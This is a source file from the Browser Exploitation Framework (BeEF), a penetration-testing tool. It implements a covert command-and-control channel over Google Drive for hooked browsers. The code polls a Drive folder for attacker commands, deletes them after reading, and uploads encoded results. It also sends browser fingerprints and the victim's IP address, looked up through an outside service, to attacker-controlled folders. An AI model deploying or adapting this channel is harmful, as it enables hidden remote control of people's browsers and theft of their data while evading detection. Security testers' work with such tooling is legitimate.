//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


/**
 * @Literal object: beef.gdrive
 *
 * Manage the Google Drive communication channel.
 * This channel is more esoteric but gives anonimity
 * if beef.http.gdrive.enable = true.
 */

beef.gdrive = {

    /**TODO: make macrosubstitutions instead values **/
    hook: "<%= @beef_hook %>", // TODO: delete
    //keychain file contains actual value of oauth key
    keychain_file_id: "",
    //command folder contains files with commands sent by framework
    cmd_folder_id: "",
    //apikey for keychain file
    api_key: "",
    //oauth2 auth key to modify files on the disk
    auth_key: "",
    auth_key_renew_interval: 60*60,

    /**TODO: form all api links into one dict **/
    //gdrive api link to get a file 
    api_file_url: "https://www.googleapis.com/drive/v2/files",
    //gdrive api link to upload a file 
    api_insert_url: "https://www.googleapis.com/upload/drive/v2/files",
    //some nice comment
    answers_folder_id: "",
    init_folder_id: "",



    /**
     * Init module and set timer to update authkey.
     * @return: {Integer} TODO
     */
    init: function () {
	beef.gdrive.lock = false;
        beef.gdrive.pull_auth_key();
        setInterval("beef.gdrive.pull_auth_key", beef.gdrive.auth_key_renew_interval);
    },

    /**
     * Pulls actual oauth key value from keychain file.
     * @return: {Integer} TODO
     */
    pull_auth_key: function () {
        var get_url = this.api_file_url + '/' + this.keychain_file_id +
            '?key=' + this.api_key + '&alt=media';
        $j.get(get_url, function (data) {
            beef.gdrive.auth_key = data;
        },'text')
    },


    /**
     * Write results to the "answers" directory
     * NOTE: Send Browser Fingerprinting results to the "init" directory
     * @param: {String} handler: the server-side handler that will be called
     * @param: {Integer} cid: command id
     * @param: {String} results: the data to send
     * @param: {Integer} exec_status: the result of the command execution (-1, 0 or 1 for 'error', 'unknown' or 'success')
     * @param: {Function} callback: the function to call after execution
     */
    send_results: function (handler, cid, results, exec_status, callback) {
        if (beef.gdrive.auth_key == '') {
            setTimeout(function () {
                beef.gdrive.send_results(handler, cid, results, exec_status, callback);
            }, 1);
            return;
        }
    
        var folder_id = '';
        if (handler == '/init') {
            folder_id = beef.gdrive.init_folder_id;
        } else {
            folder_id = beef.gdrive.answers_folder_id;
        }

        var result_string = '{"handler" : "' + handler + '", "cid" :"' + cid +
                            '", "result":"' + beef.encode.base64.encode(beef.encode.json.stringify(results)) +
                            '", "status": "' + exec_status +
                            '", "callback": "' + callback +
                            '","bh":"' + beef.session.get_hook_session_id() + '" }';
        
        // Core waiting for array of answers for all hadlers except /init
        if (handler != '/init') {
            result_string = '[' + result_string + ']';
        }

        beef.gdrive.upload_file(cid + 'ans', result_string, folder_id);
    },

    /**
     * Upload file to Google Drive
     * @param: {String} file_name: name of the file on the Google Drive
     * @param: {String} file_contents: content of the uploading file
     * @param: {String} parent_folder: folder in which the file will be stored
     */
    upload_file: function (file_name, file_contents, parent_folder) {
        const boundary = '-------answer';
        const delimiter = "\r\n--" + boundary + "\r\n";
        const close_delim = "\r\n--" + boundary + "--";
        var metadata = {
            'title': file_name,
            'parents': [{ id: parent_folder }],
            'mimeType': 'text/plain'
        };

        var base64Data = beef.encode.base64.encode(file_contents);
        var multipartRequestBody =
            delimiter +
            'Content-Type: application/json\r\n\r\n' +
            JSON.stringify(metadata) +
            delimiter +
            'Content-Type: text/plain\r\n' +
            'Content-Transfer-Encoding: base64\r\n' +
            '\r\n' +
            base64Data +
            close_delim;

        $j.ajax({
            type: 'POST',
            url: this.api_insert_url + '?uploadType=multipart',
            dataType: 'multipart/mixed; boundary="' + boundary + '"',
            data: multipartRequestBody,
            beforeSend: function (xhr) {
                xhr.setRequestHeader("Authorization", 'Bearer ' + beef.gdrive.auth_key);
                // great thanks to net.js developer
                xhr.setRequestHeader("Content-type", 'multipart/mixed; boundary="' + boundary + '"');
            },
        })
    },

    /**
     * Move a file to the trash.
     * @param: {String} file_id: id of the file on Google Drive
     */
    move_to_trash: function (file_id) {
        $j.ajax({
            type: 'POST',
            url: beef.gdrive.api_file_url + '/' + file_id + '/trash/',
            dataType: 'json',
            data: '',
            beforeSend: function (xhr) {
                xhr.setRequestHeader("Authorization", 'Bearer ' + beef.gdrive.auth_key);
            },
        })
        
    },

    /**
     * Pull file's content and move file to the trash.
     * @param: {String} file_id: file id in gdrive api
     * @param: {Function} file_callback: the function with file_id argument to call on succes 
     * @param: {Function} data_callback: the function with file data as argument to call on succes 
     */
    pull_file_content: function (file_id, file_callback, data_callback) {
        var get_url = beef.gdrive.api_file_url + '/' + file_id + '?alt=media';
        $j.ajax({
            type: 'GET',
            url: get_url,
            dataType: 'text',
            beforeSend: function (xhr) {
                xhr.setRequestHeader("Authorization", 'Bearer ' + beef.gdrive.auth_key);
            },
            success: function (data) {
                file_callback(file_id);
                data_callback(data);

            }
        })
    },

    /**
     * Get the command folder ID
     * It will be used to look up for commands sent by the framework
     */
    get_cmd_folder_id: function () {
        var get_url = beef.gdrive.api_file_url +
            '?q=title=%27' + beef.session.get_hook_session_id() + '%27' +
            '+and+mimeType=%27application/vnd.google-apps.folder%27' +
            '+and+trashed=false' +
            '&fields=items/id';
        
        $j.ajax({
            type: 'GET',
            url: get_url,
            dataType: 'json',
            beforeSend: function (xhr) {
                xhr.setRequestHeader("Authorization", 'Bearer ' + beef.gdrive.auth_key);
            },
            success: function (data) {
                if (data.items[0] && data.items[0].hasOwnProperty('id'))
                    beef.gdrive.cmd_folder_id = data.items[0]['id'];
            }
        });
    },

    /**
     * Get file ID's in the choosen directory
     * @param: {Function} callback: the function to call on every file ID
     */
    get_cmd_files_ids: function (callback) {
        if (beef.gdrive.cmd_folder_id == '' || beef.gdrive.lock) {
            beef.gdrive.get_cmd_folder_id();
            return;
        }

        var get_url = beef.gdrive.api_file_url +
            '?q=%27' + beef.gdrive.cmd_folder_id + '%27+in+parents' +
            '+and+trashed=false' +
            '&fields=items/id';

        $j.ajax({
            type: 'GET',
            url: get_url,
            dataType: 'json',
            beforeSend: function (xhr) {
                xhr.setRequestHeader("Authorization", 'Bearer ' + beef.gdrive.auth_key);
            },
            success: function (data) {
		beef.gdrive.lock = true;
                $j.each(data.items, function (index, value) {
                    callback(value['id']);
                })
            }
        });
    },

    /**
     * Pull new server commands
     * @param: {Function} callback: the function to call on every file ID (!)
     */
    pull_commands: function (callback) {
        if (beef.gdrive.auth_key == '')
            //not initialized yet 
            return;
        beef.gdrive.get_cmd_files_ids(function (id) {
            beef.gdrive.pull_file_content(id, beef.gdrive.move_to_trash, callback)
        })
    },

    /**
     * Get client IP using https://api.ipify.org
     * @param: {Function} callback: function that will be called on obtained IP
     */
    get_client_IP: function (callback) {
        $j.ajax({
            type: 'GET',
            url: 'https://api.ipify.org?format=text',
            dataType: 'text',
            success: function (ip) {
                callback(ip);
            }
        });
    },

    /**
     * Sends back browser details to framework, calling beef.browser.getDetails()
     */
    browser_details: function () {
        if (beef.gdrive.auth_key == '') {
            setTimeout("beef.gdrive.browser_details()", 1);
        } else {
            beef.gdrive.get_client_IP(function (ip) {
                var details = beef.browser.getDetails();
                details.IP = ip;
                beef.gdrive.send_results('/init', 0, beef.net.clean(details));
            })
            
        }
    }
};

beef.regCmp('beef.gdrive');
